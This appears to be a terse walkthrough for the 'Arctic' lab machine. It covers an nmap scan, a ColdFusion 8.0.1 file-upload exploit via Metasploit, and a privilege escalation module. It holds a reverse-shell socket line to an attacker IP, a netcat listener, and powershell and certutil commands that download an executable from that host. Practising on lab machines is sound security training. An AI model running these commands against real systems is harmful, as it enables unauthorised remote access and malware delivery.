----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Arctic
# 25/3/2023
10.10.10.11

----------------------------------------------------
# nmap
----------------------------------------------------
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC


----------------------------------------------------
# exploitation
----------------------------------------------------
10.10.10.11:8500/CFIDE/administrator/

└─$ searchsploit coldfusion
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                | cfm/webapps/16788.rb


msfconsole
msf6 > search coldfusion
msf6 > use exploit/windows/http/coldfusion_fckeditor
set options
use burp proxy trubleshoot bit
in burp
    Socket socket = new Socket( "10.10.16.3", 4444 );

nc -lvnp 4444


http://localhost:8500/userfiles/file/NQ.jsp

powershell -c wget "http://10.10.16.3:80/writeup.exe" -outfile "exploit.exe" 

 powershell "(new-objectSystem.Net.WebClient).Downloadfile('http://10.10.16.3/writeup.exe', 'writeup.exe')"


use msfconsole and exploit suggester
certutil -urlcache -split -f "http://10.10.16.3/writeup.exe" exploit.exe


----------------------------------------------------
# priv esc
----------------------------------------------------

exploit/windows/local/ms10_092_schelevator